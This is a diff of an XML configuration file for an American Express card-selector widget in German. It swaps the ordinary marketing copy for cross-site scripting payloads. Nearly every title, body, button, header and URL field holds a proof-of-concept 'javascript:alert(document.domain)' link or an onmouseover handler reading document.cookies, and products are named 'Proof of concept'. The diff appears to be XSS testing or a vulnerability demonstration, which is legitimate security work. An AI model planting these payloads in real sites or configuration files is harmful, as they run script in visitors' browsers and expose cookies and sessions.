@@ -21,90 +21,19 @@
    </settings>
    <top_options>
       <option id="0">
-         <title><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a>]]></title>
-         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><svg onload='javascript:alert(document.domain)'></svg><img src='x' onload='javascript:alert(document.domain)'></img>]]></body>
-         <button><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a>]]></button>
+         <title><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></title>
+         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></body>
+         <button><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></button>
       </option>
-      <option id="1">
-         <title><![CDATA[Karten vergleichen]]></title>
-         <body><![CDATA[Sie haben schon einige Karten im Blick? Vergleichen Sie die Vorteile noch einmal im Detail.]]></body>
-         <button><![CDATA[Jetzt vergleichen]]></button>
+      <option id="">
+         <title><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></title>
+         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></body>
+         <button><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></button>
       </option>
       <option id="2">
-         <title><![CDATA[Hilfe bei der Kartenwahl]]></title>
-         <body><![CDATA[Sie haben noch gar keine Idee, welche American Express Karte für Sie die richtige sein könnte? Wir helfen Ihnen gerne bei der Auswahl.]]></body>
-         <button><![CDATA[Jetzt helfen lassen]]></button>
+         <title><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></title>
+         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></body>
+         <button><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></button>
       </option>
    </top_options>
-   <sections>
-      <section id="0">
-         	<title><![CDATA[Gleich beantragen]]></title>
-         	<apply_now><![CDATA[Jetzt beantragen]]></apply_now>
-	<loading><![CDATA[Lade]]></loading>
-	<more_features><![CDATA[Vorteile der Karte]]></more_features>
-      </section>
-      <section id="2">
-         <title><![CDATA[Hilfe bei der Kartenwahl]]></title>
-	 <heading><![CDATA[Beantworten Sie die nachfolgenden vier Fragen. Dann sagen wir Ihnen, welche Karte am besten zu Ihnen passt.]]></heading>
-
- 	<loading><![CDATA[Lade]]></loading>	
-	 <submit_label><![CDATA[Karte anzeigen]]></submit_label>
-	 <submit_message><![CDATA[Bitte beachten Sie, dass Sie alle Fragen beantwortet haben.]]></submit_message>
-	 <apply_label><![CDATA[Jetzt beantragen]]></apply_label>
-	 <more_label><![CDATA[Mehr Vorteile]]></more_label>
-	 <choice1_label><![CDATA[Erste Empfehlung]]></choice1_label>
-	 <choice2_label><![CDATA[Zweite Empfehlung]]></choice2_label>
-	 <firstrecommendation_label><![CDATA[Unsere erste Empfehlung]]></firstrecommendation_label>
-	 <secondrecommendation_label><![CDATA[Unsere zweite Empfehlung]]></secondrecommendation_label>
-	 <tc_label><![CDATA[Mitgliedschaftsbedingungen]]></tc_label> 	
-	 <image_load_label><![CDATA[Bild wird geladen]]></image_load_label>	
-	 <please_select_label><![CDATA[Bitte wählen]]></please_select_label>
-         <back_label><![CDATA[Zurück]]></back_label>
-         <back_questionnaire_label><![CDATA[Zurück zum Fragebogen]]></back_questionnaire_label>
-      </section>
-   </sections>
-   <products>
- 			<product id="1" image_use_url="1">
-				<name>Proof of concept</name>
-				<image>jpg/large/LRG_DE_personal.jpg</image>
-				<image_small>jpg/small/sml_DE_green.jpg</image_small>
-				<info>
-					<header><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></header>
-					<copy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></copy>
-					<tccopy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></tccopy>
-				</info>
-				<features>
-					<comparelink><![CDATA[javascript:alert(document.domain)]]></comparelink>
-				</features>
-				<url><![CDATA[javascript:alert(document.domain)]]></url>
-		</product>
-			<product id="2" image_use_url="1">
-					<name>Proof of concept</name>
-				<image>jpg/large/LRG_DE_personal.jpg</image>
-				<image_small>jpg/small/sml_DE_green.jpg</image_small>
-				<info>
-					<header><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></header>
-					<copy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></copy>
-					<tccopy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></tccopy>
-				</info>
-				<features>
-					<comparelink><![CDATA[javascript:alert(document.domain)]]></comparelink>
-				</features>
-				<url><![CDATA[javascript:alert(document.domain)]]></url>
-			</product>
-			<product id="3" image_use_url="1">
-					<name>Proof of concept</name>
-				<image>jpg/large/LRG_DE_personal.jpg</image>
-				<image_small>jpg/small/sml_DE_green.jpg</image_small>
-				<info>
-					<header><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></header>
-					<copy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></copy>
-					<tccopy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></tccopy>
-				</info>
-				<features>
-					<comparelink><![CDATA[javascript:alert(document.domain)]]></comparelink>
-				</features>
-				<url><![CDATA[javascript:alert(document.domain)]]></url>
-			</product>
-	</products>
 </PESCardSelector>
